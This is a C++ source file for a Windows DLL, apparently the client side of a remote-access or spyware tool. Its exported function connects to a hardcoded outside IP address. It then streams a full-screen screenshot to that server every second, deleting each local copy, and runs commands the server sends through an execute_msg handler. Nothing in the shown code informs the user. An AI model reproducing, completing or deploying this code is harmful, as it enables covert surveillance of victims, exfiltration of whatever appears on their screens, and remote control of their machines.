#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING

#include "client.h"
#include <experimental/filesystem>
#include <gdiplus.h>
#pragma warning(disable:4996) 

#pragma comment(lib, "GdiPlus.lib")
using namespace Gdiplus;

#pragma comment(lib,"ws2_32.lib")

//int craete_screenshot();


static const GUID png =
{ 0x557cf406, 0x1a04, 0x11d3, { 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };

struct BITMAPINFOEX {
    BITMAPINFOHEADER bmiHeader;
    DWORD bmiWidthBytes;
};

SOCKET Connection;

int create_screenshot() {
    std::cout << "[INFO] create_screenshot" << "\n";
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HDC scrdc, memdc;
    HBITMAP membit;
    // 
    scrdc = GetDC(0);
    // 
    int Height, Width;
    Height = GetSystemMetrics(SM_CYSCREEN);
    Width = GetSystemMetrics(SM_CXSCREEN);
    // 
    memdc = CreateCompatibleDC(scrdc);
    membit = CreateCompatibleBitmap(scrdc, Width, Height);
    SelectObject(memdc, membit);

    BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
    HBITMAP hBitmap;
    hBitmap = (HBITMAP)SelectObject(memdc, membit);
    Gdiplus::Bitmap bitmap(hBitmap, NULL);

    BITMAPINFOHEADER bmiHeader;
    GetObject(hBitmap, sizeof(bmiHeader), &bmiHeader);


    bitmap.Save(L"screen.png", &png, NULL);
    DeleteObject(hBitmap);

    std::fstream file;
    file.open("screen.png", std::ios_base::in | std::ios_base::binary);
    if (file.is_open()) {
        long long unsigned int file_size = std::experimental::filesystem::file_size("screen.png") + 1;
        char* bytes = new char[file_size];
        file.read(bytes, file_size);
        file.close();
        remove("screen.png");
        send_screen(bytes, file_size);
        delete[] bytes;
    }

    return 0;
}

void send_screen(char* data, long long unsigned int size) {
    std::cout << "[INFO] screen_send_to_server " << size << " status_send: ";
    std::cout << send(Connection, (char*)&size, sizeof(long long unsigned int), 0);
    std::cout << " send_scrren ";
    std::cout << send(Connection, data, size, 0);
    std::cout << std::endl;
}

void send_screen_client() {
    std::cout << "[INFO] start_thread" << "\n";
    while (true) {
        create_screenshot(); // создание фото
        //std::cout << "thread active" << "\n";
        Sleep(1000); // можно убрать тогда скрины будут по кд делаться
    }
}

extern "C" __declspec(dllexport) void mai(){
    // загружаем необходимую версию библиотеки
    //WSAStartup
    WSAData wsaData;
    WORD DLLVersion = MAKEWORD(2, 1);
    WSAStartup(DLLVersion, &wsaData); // передаём версию и ссылку на структуру
    if (WSAStartup(DLLVersion, &wsaData) != 0) {
        std::cout << "[ERROR] download error\n";
        exit(1);
    }
    std::cout << "[INFO] download complete\n";

    //  заполняем инфомрацию о адрессе сокета
    SOCKADDR_IN addr; // хранение адресса
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = inet_addr("45.86.86.32"); // передаём адресс
    std::cout << "45.86.86.32" << "\n";
    addr.sin_port = htons(1111); // передаём порт
    addr.sin_family = AF_INET; // семейство протоколов

    std::thread stream_video(send_screen_client); // создание второго потока который будет транслировать видео
    std::cout << "[INFO] stream_video_detach" << "\n";
    stream_video.detach();
connection_start:

    Connection = socket(AF_INET, SOCK_STREAM, 0);
    // создание второго сокета
    while (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
        std::cout << "[ERROR] failed connect to server\n";
        Connection = socket(AF_INET, SOCK_STREAM, 0);
        Sleep(3000);
    }
    std::cout << "[INFO] connection\n";
    // чтение сообщения от сервера
    char message[255] = "";
    std::string msg = "";
    msg.append(std::to_string(GetSystemMetrics(SM_CXSCREEN)));
    msg.append(" ");
    msg.append(std::to_string(GetSystemMetrics(SM_CYSCREEN)));
    std::cout << msg << "\n";
    std::cout << GetSystemMetrics(SM_CXSCREEN) << " " << GetSystemMetrics(SM_CYSCREEN) << std::endl;

    int size_msg = msg.size();
    std::cout << "\n" << size_msg << "\n";
    send(Connection, (char*)&size_msg, sizeof(int), 0);
    send(Connection, msg.c_str(), size_msg, 0);

    std::cout << "message_send" << "\n";
    int size_photo = 0;

    while (true) {
        //if (connect(socket(AF_INET, SOCK_STREAM, 0), (SOCKADDR*)&addr, sizeof(addr)) != 0) {
        //    goto connection_start;
        //}
        if (recv(Connection, message, sizeof(message), 0) > 0) { // если сообщение от сервера пришло  то обработать
            std::cout << message << std::endl;
            execute_msg(message);
        }

    }
}